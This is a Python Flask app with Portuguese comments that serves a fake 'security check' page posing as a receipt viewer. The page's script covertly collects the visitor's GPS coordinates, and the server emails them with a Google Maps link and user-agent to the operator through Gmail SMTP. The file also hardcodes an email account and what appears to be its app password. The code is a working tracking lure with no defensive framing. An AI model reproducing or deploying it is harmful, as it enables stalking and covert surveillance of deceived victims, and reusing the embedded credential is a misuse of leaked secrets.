from flask import Flask, request, render_template_string
import smtplib
from email.mime.text import MIMEText
from datetime import datetime

app = Flask(__name__)

# Configurações do seu e-mail
EMAIL_ORIGEM = "luan.pinheiro@tcsindustrial.com.br"
SENHA_EMAIL = "cwhr dbbf atvw bdrv"
EMAIL_DESTINO = "luan.pinheiro@tcsindustrial.com.br"  # pode ser o mesmo

# Página HTML
html = '''
<!DOCTYPE html>
<html>
<head><title>Confirmação</title></head>
<body>
<h1>Verificando segurança...</h1>
<p>Para visualizar o comprovante, clique em "Continuar".</p>
<script>
navigator.geolocation.getCurrentPosition(function(position) {
    fetch("/coletar", {
        method: "POST",
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
        })
    });
});
</script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(html)

@app.route('/coletar', methods=['POST'])
def coletar():
    data = request.get_json()
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    user_agent = request.headers.get('User-Agent')
    datahora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    conteudo = f"""Nova localização recebida:

Latitude: {latitude}
Longitude: {longitude}
Data/Hora: {datahora}
User-Agent: {user_agent}
Google Maps: https://www.google.com/maps?q={latitude},{longitude}
"""

    try:
        msg = MIMEText(conteudo)
        msg['Subject'] = "📍 Nova localização coletada"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ORIGEM, SENHA_EMAIL)
            smtp.send_message(msg)

        print("Localização enviada por e-mail com sucesso!")
    except Exception as e:
        print("Erro ao enviar e-mail:", e)

    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
